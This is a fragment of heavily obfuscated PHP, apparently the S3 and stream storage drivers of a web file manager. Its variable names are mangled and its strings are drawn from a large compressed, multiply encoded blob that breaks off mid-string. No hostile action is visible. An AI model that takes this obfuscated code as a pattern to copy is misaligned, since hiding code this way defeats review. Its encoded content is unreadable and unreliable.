$ıŒÍàÑ[1469]); } public function size($†Ãî¾´) { $’®ğíœ§ = $this->objectMeta($†Ãî¾´); return $’®ğíœ§ ? $’®ğíœ§[$_SERVER[³½¬ÚË¯][76]] : 0; } public function info($Í­ÏßË³) { if ($this->isFolder($Í­ÏßË³)) { return $this->folderInfo($Í­ÏßË³); } else { if ($this->isFile($Í­ÏßË³)) { return $this->fileInfo($Í­ÏßË³); } } return !1; } public function exist($úÁÌïı¢) { return $this->isFile($úÁÌïı¢) || $this->isFolder($úÁÌïı¢); } public function isFile($‹…—º¿£) { return !$this->isFolder($‹…—º¿£) && $this->objectMeta($‹…—º¿£); } public function isFolder($­ã‰Ÿ˜†) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][166], $­ã‰Ÿ˜†); } protected function objectMeta($‚Ä ‹…) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][168], $‚Ä ‹…); } protected function _objectMeta($ıÓ‚½øè) { $Ó÷£ì“… =& $_SERVER[³½¬ÚË¯]; list($ğà”áš¼, $öÊÒÉ½ˆ) = $this->bucketManager->stat($this->bucket, $ıÓ‚½øè); if ($ğà”áš¼) { $ğà”áš¼[$Ó÷£ì“…[76]] = intval($ğà”áš¼[$Ó÷£ì“…[1455]]); } return $ğà”áš¼; } protected function _isFolder($ªŞÇ¨Ÿ‡) { $™Ø¼Öí¢ =& $_SERVER[³½¬ÚË¯]; if ($ªŞÇ¨Ÿ‡ == $™Ø¼Öí¢[12] || $ªŞÇ¨Ÿ‡ == $™Ø¼Öí¢[8]) { return !0; } list($„Ğêõ‡ü, $Ü×•µà¸) = $this->bucketManager->listFiles($this->bucket, trim($ªŞÇ¨Ÿ‡, $™Ø¼Öí¢[8]) . $™Ø¼Öí¢[8], $™Ø¼Öí¢[12], 1, $™Ø¼Öí¢[8]); return !empty($„Ğêõ‡ü[$™Ø¼Öí¢[1458]]) || !empty($„Ğêõ‡ü[$™Ø¼Öí¢[1459]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Õùèâñ) { parent::__construct($Õùèâñ); } public function uploadFormData($§óÙ¦¼ï, $İ·ñ”áã = 3600) { $½¢¬õ =& $_SERVER[³½¬ÚË¯]; $‰ÅÓ…Øä = $½¢¬õ[213]; $œ¡ş¯À = $½¢¬õ[253]; $ÄŠŠÂ¿ô = $½¢¬õ[62]; $×¯¥Æõ• = gmdate($½¢¬õ[254]); $Ô»®®§ = gmdate($½¢¬õ[255]); $å©äıØ÷ = $½¢¬õ[256]; $Î¦’Æö¬ = $İ·ñ”áã . $½¢¬õ[12]; $¬ôŸÄøà = $½¢¬õ[257]; $–Ò±Š—¡ = array($this->accessKey, $Ô»®®§, $this->region, $ÄŠŠÂ¿ô, $å©äıØ÷); $¯ğñĞ¡” = implode($½¢¬õ[8], $–Ò±Š—¡); $÷óÑ·¹Ä = array($½¢¬õ[258] => gmdate($½¢¬õ[1367], strtotime($½¢¬õ[260])), $½¢¬õ[261] => array(array($½¢¬õ[262] => $this->bucket), array($½¢¬õ[263] => $‰ÅÓ…Øä), array($½¢¬õ[264], $½¢¬õ[265], $½¢¬õ[12]), array($½¢¬õ[264], $½¢¬õ[266], $½¢¬õ[12]), array($½¢¬õ[264], $½¢¬õ[267], $½¢¬õ[12]), array($½¢¬õ[268] => $¬ôŸÄøà), array($½¢¬õ[269] => $¯ğñĞ¡”), array($½¢¬õ[270] => $œ¡ş¯À), array($½¢¬õ[271] => $×¯¥Æõ•), array($½¢¬õ[272] => $Î¦’Æö¬))); $„ùºÔŒÊ = base64_encode(json_encode($÷óÑ·¹Ä)); $¢ŞÒ¬¼€ = hash_hmac($½¢¬õ[273], $Ô»®®§, $½¢¬õ[274] . $this->secret, !0); $ƒµ”øà¹ = hash_hmac($½¢¬õ[273], $this->region, $¢ŞÒ¬¼€, !0); $Ô³ò…„Ğ = hash_hmac($½¢¬õ[273], $ÄŠŠÂ¿ô, $ƒµ”øà¹, !0); $ğ®‚“Ö• = hash_hmac($½¢¬õ[273], $å©äıØ÷, $Ô³ò…„Ğ, !0); $æ‰è‘‘ª = hash_hmac($½¢¬õ[273], $„ùºÔŒÊ, $ğ®‚“Ö•); $ğÆœ÷ ± = array($½¢¬õ[230] => $½¢¬õ[12], $½¢¬õ[275] => $½¢¬õ[12], $½¢¬õ[263] => $‰ÅÓ…Øä, $½¢¬õ[268] => $¬ôŸÄøà, $½¢¬õ[276] => $„ùºÔŒÊ, $½¢¬õ[277] => $¯ğñĞ¡”, $½¢¬õ[278] => $œ¡ş¯À, $½¢¬õ[279] => $×¯¥Æõ•, $½¢¬õ[280] => $Î¦’Æö¬, $½¢¬õ[281] => $æ‰è‘‘ª, $½¢¬õ[196] => $this->getHost()); return $ğÆœ÷ ±; } public function multiUploadFormData($¥í¯¶Ä­, $Ó¹¯º  = 3600) { $¥ÏÉø¡ô =& $_SERVER[³½¬ÚË¯]; $Íî‘¥Ÿ = gmdate($¥ÏÉø¡ô[1470]); $˜åµË½Œ = array(); $áÊçğÆ = $this->client->getUploadId($this->bucket, $¥í¯¶Ä­, $˜åµË½Œ); if (!$áÊçğÆ) { return !1; } return array($¥ÏÉø¡ô[238] => $áÊçğÆ, $¥ÏÉø¡ô[196] => $this->getHost() . $¥ÏÉø¡ô[8] . $this->pathEncode($¥í¯¶Ä­), $¥ÏÉø¡ô[239] => $Íî‘¥Ÿ, $¥ÏÉø¡ô[94] => $¥í¯¶Ä­); } public function multiUploadAuthData($•­Êéİ, $Ù‚©›÷™ = array()) { $ØÆÔŠ‡½ =& $_SERVER[³½¬ÚË¯]; $ã”Ô ™÷ = isset($Ù‚©›÷™[$ØÆÔŠ‡½[175]]) ? $Ù‚©›÷™[$ØÆÔŠ‡½[175]] : $ØÆÔŠ‡½[12]; $ô²ø÷ø– = $Ù‚©›÷™[$ØÆÔŠ‡½[94]]; unset($Ù‚©›÷™[$ØÆÔŠ‡½[94]]); if (isset($Ù‚©›÷™[$ØÆÔŠ‡½[240]])) { return $this->listUploadParts($ô²ø÷ø–, $Ù‚©›÷™); } $á¨÷¤´ = array(); if (isset($Ù‚©›÷™[$ØÆÔŠ‡½[1471]])) { $á¨÷¤´[$ØÆÔŠ‡½[1472]] = $Ù‚©›÷™[$ØÆÔŠ‡½[1471]]; } $¹ëØÛû = explode($ØÆÔŠ‡½[198], $this->getHost()); $½ƒæÖ–¾ = array($ØÆÔŠ‡½[1473] => $¹ëØÛû[1], $ØÆÔŠ‡½[1474] => $ØÆÔŠ‡½[12], $ØÆÔŠ‡½[230] => $ØÆÔŠ‡½[120], $ØÆÔŠ‡½[275] => $Ù‚©›÷™[$ØÆÔŠ‡½[76]]); $ª²Ü—Ë = $ØÆÔŠ‡½[243]; $Ø­Èó¸ã = $ØÆÔŠ‡½[8] . $this->pathEncode($ô²ø÷ø–) . $ã”Ô ™÷; $·¨ğ­ = $this->client->__getSignatureV4($á¨÷¤´, $½ƒæÖ–¾, $ª²Ü—Ë, $Ø­Èó¸ã); if (strpos($ã”Ô ™÷, $ØÆÔŠ‡½[242]) === 0) { if (isset($á¨÷¤´[$ØÆÔŠ‡½[1472]])) { $óªÅ” = $á¨÷¤´[$ØÆÔŠ‡½[1472]]; } else { if (isset($·¨ğ­[$ØÆÔŠ‡½[1472]])) { $óªÅ” = $·¨ğ­[$ØÆÔŠ‡½[1472]]; } else { $óªÅ” = hash($ØÆÔŠ‡½[273], $ØÆÔŠ‡½[12]); } } return array($ØÆÔŠ‡½[249] => $·¨ğ­[$ØÆÔŠ‡½[249]], $ØÆÔŠ‡½[1472] => $óªÅ”, $ØÆÔŠ‡½[239] => $·¨ğ­[$ØÆÔŠ‡½[1475]]); } return $·¨ğ­[$ØÆÔŠ‡½[249]]; } public function listUploadParts($ÀÓ´–ù®, $Û¥öÂæ† = array()) { $ëÜˆ‰¨ú =& $_SERVER[³½¬ÚË¯]; $ñÆ–½ÄÈ = str_replace($ëÜˆ‰¨ú[250], $ëÜˆ‰¨ú[12], $Û¥öÂæ†[$ëÜˆ‰¨ú[175]]); $ü–ß™ • = $this->client->listParts($this->bucket, $ÀÓ´–ù®, $ñÆ–½ÄÈ); if (!$ü–ß™ •) { return !1; } $å€öîÂÂ = $ëÜˆ‰¨ú[1476]; foreach ($ü–ß™ • as $ı¶³×ÎÁ) { $å€öîÂÂ .= $ëÜˆ‰¨ú[1477] . "\x3c\120\x61\162\x74\x4e\x75\155\x62\145\x72\76{$ı¶³×ÎÁ[$ëÜˆ‰¨ú[1432]]}\74\x2f\120\141\162\x74\x4e\165\155\x62\145\x72\x3e\12" . "\x3c\x45\124\141\x67\76{$ı¶³×ÎÁ[$ëÜˆ‰¨ú[1433]]}\74\x2f\105\124\x61\x67\x3e\xa" . $ëÜˆ‰¨ú[1478]; } $å€öîÂÂ .= $ëÜˆ‰¨ú[1479]; $¢´ê»â’ = array(); $§‚Àî†ò = explode($ëÜˆ‰¨ú[198], $this->getHost()); $˜íšâ± = array($ëÜˆ‰¨ú[1473] => $§‚Àî†ò[1], $ëÜˆ‰¨ú[230] => $ëÜˆ‰¨ú[120], $ëÜˆ‰¨ú[275] => strlen($å€öîÂÂ)); $Ü€ï®ò = $ëÜˆ‰¨ú[241]; $¾¯éıÕ¥ = $ëÜˆ‰¨ú[8] . $this->pathEncode($ÀÓ´–ù®) . $Û¥öÂæ†[$ëÜˆ‰¨ú[175]]; $Ù·£ÛÈ” = $this->client->__getSignatureV4($¢´ê»â’, $˜íšâ±, $Ü€ï®ò, $¾¯éıÕ¥, $å€öîÂÂ); return array($ëÜˆ‰¨ú[249] => $Ù·£ÛÈ”[$ëÜˆ‰¨ú[249]], $ëÜˆ‰¨ú[239] => $Ù·£ÛÈ”[$ëÜˆ‰¨ú[1475]], $ëÜˆ‰¨ú[251] => $ü–ß™ •, $ëÜˆ‰¨ú[1472] => $Ù·£ÛÈ”[$ëÜˆ‰¨ú[1472]]); } public function link($ã¸ƒõ™º, $”–âûÇ = array()) { return parent::link($ã¸ƒõ™º, $”–âûÇ); } public function fileOut($œ¦‘‡ŞÓ, $¹ ³èÎÕ = false, $¯¬—«ó´ = false, $µ¦Şèñ¸ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[³½¬ÚË¯][1480])) { return parent::fileOutServer($œ¦‘‡ŞÓ, $¹ ³èÎÕ, $¯¬—«ó´, $µ¦Şèñ¸); } parent::fileOut($œ¦‘‡ŞÓ, $¹ ³èÎÕ, $¯¬—«ó´, $µ¦Şèñ¸); } public function fileOutImage($ÙÅ¸÷›­, $‚•Îˆıä = 250) { if (strstr($this->endpoint, $_SERVER[³½¬ÚË¯][1480])) { return parent::fileOutImageServer($ÙÅ¸÷›­, $‚•Îˆıä); } parent::fileOutImage($ÙÅ¸÷›­, $‚•Îˆıä); } public function fileOutLink($Í¨£ï±) { $ÒóªŸ =& $_SERVER[³½¬ÚË¯]; if (substr($Í¨£ï±, 0, 7) == $ÒóªŸ[1373]) { $Í¨£ï± = $ÒóªŸ[1374] . substr($Í¨£ï±, 7); } header($ÒóªŸ[162] . $Í¨£ï±); die; } public function getHost() { $‹ìêÇü =& $_SERVER[³½¬ÚË¯]; $‹£Äı› = str_rtrim(parent::getHost(), $‹ìêÇü[8] . $this->bucket); $‹£Äı› = explode($‹ìêÇü[198], $‹£Äı›); return $‹£Äı›[0] . $‹ìêÇü[198] . $this->bucket . $‹ìêÇü[10] . $‹£Äı›[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($·‘‘ÎÈ„, $Úô™ş = 0) { parent::__construct(); $this->source = $·‘‘ÎÈ„; $this->sourceSize = $Úô™ş; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÏËœêÌ® = false) { return $this->sourceSize; } public function getContent($ÅÆ»û‘ = false) { return $this->fileSubstr($ÅÆ»û‘, 0, $this->sourceSize); } public function fileSubstr($¨£ßî·· = false, $™š³Ë«¤ = 0, $ÎËùâğç = 0) { if (!$ÎËùâğç) { $ÎËùâğç = $this->sourceSize; } $¯õ ÉÃ« = $this->sourceSize - $™š³Ë«¤; if ($ÎËùâğç >= $¯õ ÉÃ«) { $ÎËùâğç = $¯õ ÉÃ«; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $™š³Ë«¤, $ÎËùâğç); } if ($this->sourceType == self::TYPE_FILE) { if ($ÎËùâğç <= 0) { return $_SERVER[³½¬ÚË¯][12]; } $—¹«ñõ² = ftell($this->source); fseek_64($this->source, $—¹«ñõ² + $™š³Ë«¤); $èÔ°óı = @fread($this->source, $ÎËùâğç); fseek_64($this->source, $—¹«ñõ²); return $èÔ°óı; } } public function hashMd5($†øºŒ¸Ò = false) { return md5($this->getContent()); } public static function hash($‚Ô¾·”», $Æ·µ½á€ = 0) { $äİ¯ÁØÚ = new PathDriverStream($‚Ô¾·”», $Æ·µ½á€); return $äİ¯ÁØÚ->hashSimple($‚Ô¾·”»); } public static function md5($Ûı´³–Í, $û†µ±÷ê = 0) { $ˆƒ¤¸®½ = new PathDriverStream($Ûı´³–Í, $û†µ±÷ê); return $ˆƒ¤¸®½->hashMd5($Ûı´³–Í); } } goto fê¯Üƒ¤Øö; a¸ ›ó: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\263\275\254\332\313\257", _kodDe('Lbl1f7Z3xg==')); $_SERVER[³½¬ÚË¯] = explode("\174\4\174\1\174\6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\24\312\326\122\312\126\150\131\72\30\202\355\104\213\355\354\116\234\104\226\145\133\104\226\214\44\73\11\266\63\31".base64_decode('SyN5bEmjzIy8JYFCoVDKWtYCZW9LWyBhDVvKXqAspVAo0NIWShK2QvvTlh/oK+8u5w==')."\56\63\222\341\177\337\173\337\367\370\210\165\357\271\313\334\345\334\163\317\75\367\234\163\337\73\343\364\173\36\271\143\343\356\33\167\335\270\307\355\27\235\163\362\203\77\246\341\215"."\273\241\277\273\321\360\67\277\267\327\56\344\277\3\277\167\146\103\103\367\202\175\346\304\277\174\356\355\67\151\67\153\67\152\347\44\142\117\76\25\335\367\231\33\217\213\354\270\356"."\311\251\35\273\356\262\362\262\233\127\264\242\314\264\154\53\375\121\112\246\243\350\223\206\355\330\24\220\61\113\71\43\117\303\106\211\376\6\351\117\137\62\146\351\105\323\321\151\64"."\x40\x7f\x54\x68\x17\xf9\x6b\xaf\x2f\x18\x2c\x5d\x8d\x27\xd2\x6a\xaa\xaf\xb7\x37\x92\x4c\x43\xa6\x56\x39\xbd\x68\x66\x21\x54\xd6\x2c\xad\x8\xdf\x2f\xeb\x96\x8d\x5a\x23\x57\xa7\x96\xcd\xb2\x5e\x72"."\x41\x4\x20\xab\x39\xda\xb0\x66\x43\x4d\x1d\xed\x6a\x47\xa4\x37\x96\x58\xa3\xa6\xd7\xf4\x46\x20\xc7\xb0\xba\xbe\xa2\x5b\x53\x34\x46\x82\x29\x47\xb3\x9c\xb4\x51\xd4\x79\x8e\x9\x8b\xb7\xab\x3d\xd2"."\25\215\53\351\144\50\236\12\205\323\321\104\234\202\303\211\236\236\150\272\32\236\114\304\142\355\241\360\312\352\224\336\144\250\253\47\244\240\366\25\164\325\50\345\314\6\145\35\115".base64_decode('Wac00kCnoReyNFjSWHOcqTKE0jyEpqlUKRRoJM5DWT2nVQowWh1ypGwZRY11eqU+xQ==')."\241\64\240\125\34\323\50\145\150\44\62\351\130\232\200\243\266\146\320\104\353\45\250\52\25\211\105\302\151\5\67\120\351\114\46\172\24\230\204\242\146\73\272\245\254\352\216\44\43"."\xa\x6e\x74\x5b\x3d\xe9\x6b\xbd\x2\xf8\x12\x47\x43\xa1\x84\x62\x31\x65\xa6\x1a\x1c\xbd\x58\x66\xd5\xd0\x32\x35\x2a\x4b\x24\x3b\x22\x49\xa5\x7d\x8d\x22\x46\x28\x63\x16\x8b\x66\x29\x80\x6a\x41\x33"."\351\110\115\215\44\223\64\340\3\364\216\105\361\244\101\44\321\331\231\212\360\30\164\356\370\30\152\311\134\300\117\127\54\233\53\70\352\270\126\250\60\64\35\243\277\365\360\3\277"."\246\15\250\273\336\50\31\25\100\123\250\302\64\371\262\202\100\205\345\326\31\104\317\102\240\210\312\233\260\362\320\62\34\247\301\266\145\364\167\11\144\32\126\161\232\156\71\252\136".base64_decode('yphZowSLdTkgneaMdFgGykDjObOQZWHbmIau5IyCHq8U5Sw8mhkxClmLra/PykmjMQ==')."\276\134\161\136\21\53\243\226\360\225\156\344\246\304\172\303\371\172\171\252\155\126\254\214\36\105\353\203\306\233\1\254\73\16\352\34\214\215\141\366\225\13\246\226\115\351\26\357\232"."\141\166\242\212\22\25\107\6\126\110\266\116\323\52\166\40\312\0\337\107\253\302\350\253\221\60\306\326\105\126\32\261\140\303\300\311\376\377\14\15\254\100\177\32\201\364\15\102\233"."\106\364\102\101\325\47\165\130\70\305\354\174\233\15\106\320\36\66\112\101\4\241\321\150\102\35\321\354\221\236\354\174\225\224\142\24\65\253\117\6\312\43\145\130\325\174\41\17\272"."\x10\x1b\xf\x5d\xdc\x74\x22\x12\x5d\x2e\x98\x19\xad\x20\x77\x91\x86\x47\x1c\xa7\x9c\xd2\x4b\x59\x3c\x12\xd0\x15\x73\xa2\x44\x46\xaa\xac\xeb\x90\xa9\xc3\xa7\x64\x95\x1e\x65\x8d\xd2\xdd\x6a\xb4\xda".base64_decode('rGCxwEOsdxxmc6AzyaYzm6OBYbYt1MEHDZtQOLE8tXK5YGQ0xzBLQTPj6I7fdixdgw==')."\x1a\x43\x99\x8c\x6e\xdb\xfe\xb0\x59\x72\x2c\xb3\xe0\xf\x15\xa\xe6\x84\x3f\x61\x19\x79\xa3\xd4\xaa\xcc\x6\x62\x8b\x12\xd1\xa2\xf6\x63\x2\xd8\xa\x2b\xb5\x6e\x89\x82\x11\x7\x7f\x66\x76\x5b\xc5".strrev('J7ägÛ}QSfZ8æŠ­y¸i²ì0ëeTåAU£+?–éÎÉZ[sÈ±ùÉ')."\xa3\xa4\x57\xe5\x8d\x4c\x96\xd\x4b\xb7\x59\x5b\x95\xae\x9e\x34\x54\x82\x6a\xd7\xfd\xbd\x96\x96\x2f\x6a\xad\x4a\xb9\x32\x8c\x46\x6\x56\x6a\xd\x18\xcd\xd\x43\xd3\xaa\x64\x70\xd4\xa7\x14\x2b\xb6"."\343\267\164\104\212\14\264\335\301\40\107\163\376\36\274\256\14\75\353\117\41\212\15\340\271\115\363\24\204\72\12\113\243\320\356\164\272\127\215\166\242\55\71\36\121\173\102\351\160"."\x37\x34\xdb\xd1\xf2\xac\xcd\x31\x44\x87\x79\x95\xc\xb8\xda\x8f\xd6\x17\x46\xae\x38\xea\xab\x0\xf6\x9a\x13\xba\x85\x3e\xdc\x3e\xd5\xaa\x8c\x99\xd9\x61\x73\x32\xc0\x92\x70\xe6\x14\x22\x34\x2c\x33"."\x9e\xee\xb2\xe3\x4f\x6a\xa5\x3c\x1e\x9f\xe1\x29\x47\xb7\xbd\xa4\xaa\x1d\x6d\xe0\x81\x1c\x5d\xcc\x81\x61\x3d\x67\x5a\xd0\x1b\x7b\x3c\xef\x9e\x8b\x98\x5e\xca\x3b\x23\xac\xee\x54\x24\xd9\x1f\x49\xaa".base64_decode('qURnelUoCft9CSHSJGsN/nrBn9SzaHYyDiunlfHAsjx4/eCPs1S8plhaLNqFx67Dbw==').base64_decode('o0x+ORerO2YUDdw9h6eQwUbMQBc0KEj63DZoz24YzM5p9KO/sxsHBjsCs4eWBw1RJg==')."\330\34\150\126\132\232\26\50\275\210\73\61\264\202\2\235\256\312\321\244\44\126\272\207\105\40\174\311\54\351\237\61\70\170\173\223\50\203\147\130\51\60\31\71\276\57\222\112\253"."\75\221\164\167\242\3\276\36\11\101\50\146\322\225\315\172\73\100\177\206\0\1\206\350\217\152\330\235\322\316\203\243\234\102\251\346\360\50\232\214\36\235\221\141\230\371\150\121\313"."\113\373\200\352\336\46\160\14\47\366\10\344\100\130\266\312\310\362\175\4\105\273\165\43\77\2\3\146\340\352\62\146\301\264\264\2\246\236\154\341\350\214\242\345\15\240\150\345\102".base64_decode('BeFMEH8hPVIpDgPRR0xiXncED2ZPIUalyDY3tEM60Q7XFgaxoIrneTBQLuUbj4G61A==').base64_decode('lvlNGAAoCl1EzGhFrx6DQMZEi6JHG9NbcaeAxCwhUBaRaM8SvF20edcUnqdCoIgqIQ==').base64_decode('dYZNvsFRdn+Je7tQdMsyraMgBwkrZM/B8waVO3wHt9HyYeERk+/4pgWh1iD0e1ZLJw==')."\333\17\203\251\271\350\177\261\371\145\315\242\306\266\22\262\11\350\131\272\13\120\320\154\127\112\267\256\11\66\306\261\34\23\103\55\127\26\204\117\43\46\340\65\232\67\150\122\205"."\267\215\265\62\253\27\164\206\13\43\72\333\110\233\40\33\32\73\216\51\71\216\262\210\37\106\120\301\301\30\166\22\225\304\333\36\213\257\302\7\10\1\300\173\77\314\274\10\26"."\320\270\47\10\356\213\170\257\245\347\14\40\127\45\204\232\75\232\65\306\72\206\112\212\125\203\43\322\212\352\354\213\305\324\160\42\236\106\347\17\12\131\225\214\246\43\154\5\207"."\72\324\120\270\227\306\70\117\102\150\160\365\6\113\41\343\55\60\311\250\21\101\301\11\240\115\255\154\226\154\335\237\201\22\342\164\122\225\224\25\33\45\320\131\261\271\172\366\313"."\x49\xbf\x56\x9c\xf6\x17\x11\x9\xf0\xf3\xe6\xb9\xd9\x14\x5\x36\x50\xca\xed\x44\x61\x9a\xc4\xfe\x87\x7\xf\xad\x42\xc6\x1f\xf5\x26\x52\x50\x60\x39\x86\x22\x1e\x75\x98\x2f\x96\xde\x3e\x48\x2a\x4a"."\50\322\25\1\340\76\200\125\43\32\160\236\241\125\51\266\167\125\120\176\313\230\326\104\227\226\263\366\260\216\24\13\202\345\165\367\312\57\146\36\125\71\317\337\335\23\12\373\123"."\335\241\226\371\13\50\164\115\61\73\230\356\66\354\301\23\170\34\306\155\302\236\247\132\72\42\17\254\346\226\246\146\266\170\21\243\41\265\147\215\277\350\307\265\340\41\13\64\65"."\x35\xb1\xba\xe6\x2c\x50\x46\x10\x55\x2\xf4\x35\x4b\x59\x32\x2d\x30\x58\xc3\x95\xcc\x18\x5b\x21\x5a\x86\xf1\x7c\xf8\x50\x6c\xfb\x27\xc\x46\x50\x8f\xe1\xec\xf1\x31\xd5\xe8\x72\x8c\x7b\xeb\x80\x2a".base64_decode('KoS3U7UM/piKanQqtjw0aB1lUSGDsbIUqhXyaJSdkaIMFDNN4zrlsPhk8VHEY1trNw==')."\143\353\36\61\127\123\154\313\256\325\206\325\265\332\260\332\323\206\325\325\155\240\40\333\310\227\120\57\331\236\224\356\216\306\127\252\75\211\216\110\114\215\306\321\26\234\256\206\367"."\xf5\x76\x84\xd8\x4a\x95\xe1\xed\x89\x74\xb7\xb\xda\x87\x36\xe1\xfe\x50\x2c\xea\xcd\x1e\x59\x1d\x4d\xa5\x53\x35\x93\x10\xac\x2f\xe2\x49\xe9\x68\x57\x7b\x93\x91\xce\xe8\x6a\x1e\xed\x8c\x46\x62\x1d"."\x29\x35\x1c\xa\x77\x8b\x3c\xf1\x50\x4f\x84\xef\xbc\x7a\x21\x6b\x7\xdd\xf9\x55\xc4\x4d\xa4\xb8\x70\x43\x1d\xc7\x82\x1a\x86\x85\xaa\x4b\x9e\xa0\xb2\x93\xb2\x2a\x88\x5\x62\x2c\x75\x18\x70\xe8\x2e"."\26\17\221\236\250\14\111\53\214\327\341\207\252\42\333\15\212\32\320\110\215\161\204\15\364\247\121\11\245\24\247\254\162\272\77\74\305\203\244\33\54\216\266\62\370\276\2\234\115".base64_decode('VQtUnKddYj9rA0I5h/M1njiiciINzUCIyKEQJpAZgc8YiGZaTog1JydkQGqiN5IMYQ==')."\11\222\272\52\231\210\167\101\201\211\21\235\65\40\12\303\337\300\16\32\40\110\162\304\326\203\116\11\32\223\50\210\101\37\65\331\120\156\244\77\307\2\51\100\107\122\240\54\45"."\x36\xea\xc3\x78\x17\x66\x5c\x14\xb\xe4\x10\xd9\x63\x3b\xa8\x59\xe1\x5f\x1b\x36\xcd\x2\x23\xc8\x88\x11\xe6\x3b\x3\x17\x44\x8d\xda\xc\x49\x26\xd9\x9e\x32\x87\x93\x32\x40\xdd\xc4\xca\x48\x5c\x65"."\x98\x45\x63\x12\x36\x52\x40\x24\x99\x4c\x24\x61\x40\x1c\x73\x8c\xc9\x27\x68\x62\x32\x92\x62\xe4\x1c\x93\x4d\x83\xd\x57\x30\x30\x7\xb0\x58\x47\xcc\x6\x7c\x3e\xb8\x76\x70\x62\x4e\xc3\x80\x7f\x4e"."\140\10\5\32\147\257\240\121\210\15\6\134\121\306\300\125\54\136\32\237\17\32\354\345\215\255\203\301\301\140\303\362\326\201\220\177\132\363\117\67\371\27\373\207\20\333\327\70\7"."\0\103\33\132\174\363\66\341\14\50\343\362\243\207\320\117\333\340\362\131\203\376\143\117\134\267\142\140\160\250\276\165\316\121\203\201\243\7\47\206\146\67\56\147\337\311\124\54\304".base64_decode('WTKKhZqandOAmoTODTxLiextUgaWMG2UBXTDgk0MjuZQz4sSA/7BOUPLpXISyPstRA==').strrev('^dM‰»ú,Ãv‰÷+2âÇv¸) €e¬1uá-±JT~İx¢ñà\'ü…óÂ;FÑI')."\x9f\xe4\xfb\x57\xce\xb0\x0\x3b\x2b\x25\x63\x3d\xe3\x9a\x4b\xfa\x7a\x8\x98\xe\xc3\xef\x61\xdd\x99\xd0\x19\x7a\x20\xb8\x2b\x8e\x90\x83\xd1\x7d\x94\x24\xc5\xa\xd2\x9e\x41\x84\xb\xd2\x76\xcb\x98"."\274\262\212\117\22\23\74\206\266\21\230\247\275\41\267\235\321\312\172\112\352\241\252\246\103\355\261\210\312\50\14\120\142\26\47\124\261\235\213\257\121\327\4\105\145\364\41\43\316"."\252\344\344\16\53\337\136\137\120\10\141\240\234\173\53\221\344\333\225\62\146\302\25\64\343\150\154\25\264\201\53\155\313\24\72\344\120\116\225\47\240\254\61\206\20\113\236\164\261".base64_decode('6DGFgjaVxQzZiHVmzGuwYXCwMqBnhwYQ4mv+3NCGuZsa2XE2OIj+Y5FQDZmyyqmhig==')."\x18\xb1\x0\x6e\x7\x17\x2b\xba\x22\x3c\x99\x46\x4d\x8b\x73\xc0\x65\xd7\x69\xd1\x31\x1d\xad\xe0\xaa\x22\x8d\x21\x8c\x34\x31\x3e\xa\x4\x6c\x74\xb6\x63\x82\x62\x61\x9e\x4d\x12\xc6\x13\x72\x1a\xe7"."\2\55\316\10\111\322\140\134\42\245\73\1\236\303\47\45\252\50\356\272\30\151\253\143\304\276\204\226\123\130\332\352\250\230\63\105\316\226\56\11\276\255\153\126\146\244\263\122\50"."\70\374\310\132\60\306\340\13\260\126\340\102\301\17\273\301\234\132\105\73\115\213\111\207\146\103\63\352\146\327\312\30\55\225\314\354\260\214\152\142\223\355\12\41\166\46\255\64\60".base64_decode('4bcSjSvtiUQsEooreD+HfQgxC6lIbwhtYljOlEpHQB4f7fCzelf72UGZBwwYdrNM+Q==')."\106\335\121\321\331\163\214\315\245\174\324\306\147\10\37\76\360\372\60\157\341\103\255\366\341\63\262\117\234\320\174\102\334\354\33\67\364\11\22\340\247\47\37\34\252\174\342\164\17"."\301\150\207\317\260\73\310\341\220\174\200\44\261\46\240\123\65\72\334\24\264\51\37\155\116\114\37\327\13\76\166\356\367\261\66\372\230\330\303\107\304\25\35\320\254\76\264\234\240"."\x59\x24\x88\xa8\xe6\x88\xf\x23\x10\xc6\x5f\x9f\x10\x80\xfb\xd0\x61\x5c\xb7\x48\x16\x18\x18\x71\xae\xf4\x89\x33\xa7\x2f\x6f\x99\x95\x72\x2f\xfb\xa6\x14\xa3\xcd\x2\x80\x68\x33\x7\x24\x4d\xd3\xf1"."\x31\x49\x8a\x4f\x16\xa9\x40\x2b\x42\x6c\x9d\xd4\x1c\xce\xda\xbd\x21\xe3\xef\x6d\x4\xe0\x17\x4e\xaa\x1e\xa5\xcf\x99\xac\xea\xf9\x70\x4b\x93\x36\xd0\x1a\x41\x5c\xb5\x89\xed\x72\xae\x3c\x44\x98\xc3"."\xb9\x4f\x3c\xe0\x22\xd4\x2f\x16\x2a\xee\x40\xa7\x6\x57\x2d\xb4\x5a\x39\xcc\x11\xb4\xe4\x46\x54\x21\xeb\x16\xb7\x1c\x82\xd7\xf5\x4a\xb\xbc\xf7\x1f\xf8\xa3\x69\x2d\x9f\x92\x3e\xe7\x68\x79\xf6\x2d"."\114\254\120\352\214\131\151\70\251\147\246\62\102\374\320\41\11\65\334\261\12\252\41\245\345\74\335\362\221\165\124\153\15\324\236\143\216\327\174\112\366\331\173\157\66\306\14\331\371"."\374\272\326\310\347\257\116\350\27\41\201\211\262\140\42\150\143\61\31\116\241\115\255\263\300\6\245\105\116\6\2\354\163\307\360\342\12\20\202\114\256\15\123\134\62\25\213\164\246"."\225\343\22\210\172\31\246\112\313\250\70\263\102\376\230\45\305\125\67\33\56\245\215\244\213\270\126\312\122\310\72\104\351\327\265\325\261\217\324\271\212\13\64\161\67\302\307\242\112".base64_decode('NeLh4ZYHAaMD6b7YnRgoITbDCnB+mg1nMCzXg5DOYGJqZbyUyI0AsHa5voujYk0xlA==')."\120\360\7\174\22\257\202\111\212\137\254\16\51\352\36\162\17\106\172\266\120\74\104\275\106\